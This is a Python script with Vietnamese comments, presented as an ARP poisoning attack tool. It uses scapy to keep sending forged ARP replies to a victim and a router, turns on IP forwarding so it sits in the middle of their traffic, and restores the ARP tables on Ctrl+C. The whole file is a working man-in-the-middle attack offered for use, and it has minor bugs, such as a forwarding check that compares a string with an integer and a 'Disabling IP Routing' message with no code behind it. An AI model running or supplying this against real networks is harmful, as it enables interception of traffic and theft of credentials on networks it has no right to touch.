# tool tấn công ARP poisoning 

import scapy.all as scapy
import time 
import argparse 
import os 
import sys

def get_mac (ip) :  # hàm lấy địa chỉ MAC của victim và router 
    arp_request = scapy.ARP(pdst = ip) # tạo gói tin ARP request
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff") # tạo gói tin ethernet
    arp_request_broadcast = broadcast/arp_request # kết hợp 2 gói tin
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] # gửi gói tin và nhận phản hồi
    return answered_list[0][1].hwsrc # trả về địa chỉ MAC của IP 

def spoof (target_ip , host_ip , verbose = True) : # hàm tấn công ARP poisoning 
    packet = scapy.ARP(op = 2 , pdst = target_ip , hwdst = get_mac(target_ip) , psrc = host_ip) # tạo gói tin ARP reply
    # tạo một packet arp reply giả mạo (op = 2) giả vờ rằng nó là router (psrc = host_ip) và gửi đến victim (pdst = target_ip)
    scapy.send(packet , verbose = False) # gửi gói tin  

    if verbose :
        self_mac = scapy.get_if_hwaddr(scapy.conf.iface)
        print ("[+] Sent to {} : {} is-at {}".format(target_ip , host_ip , self_mac))

# khôi phục ARP về trạng thái ban đầu 
def restore (destination_ip , source_ip) : 
    destination_mac  = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2 , pdst = destination_ip , hwdst = destination_mac , psrc = source_ip , hwsrc = source_mac)
    scapy.send(packet , verbose = True) 

# bật IP forwarding để MITM hoạt động 
def _enable_linux_iproute () : 
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path , "r") as file :
        if file.read() == 1 :
            return 
    with open(file_path , "w") as file :
        file.write("1")

def enable_ip_route (verbose = True) :
    if verbose :
        print ("[+] Enabling IP Routing ...")
        _enable_linux_iproute()
    if verbose :
        print ("[+] IP Routing enabled.")

if __name__ == "__main__" : 
    # lấy tham số đầu vào 
    args = sys.argv
    # victim IP 
    target = args[1]
    # router IP
    host = args[2]
    # hiển thị progress ra màn hình 
    verbose = True
    # bật IP forwarding
    enable_ip_route()
    try :
        sent_packet_count = 0
        while True : 
            # nói với victim rằng router là mình
            spoof(target , host , verbose)
            # nói với router rằng victim là mình
            spoof(host , target , verbose)
            sent_packet_count += 2
            print ("\r[+] Packets sent : {}".format(sent_packet_count) , end = "")
            time.sleep(3) # delay 3s
    except KeyboardInterrupt :
        print ("\n[+] Detected CTRL + C ... Resetting ARP tables ... Please wait.")
        restore(target , host)
        restore(host , target)
        print ("[+] Disabling IP Routing ...")
        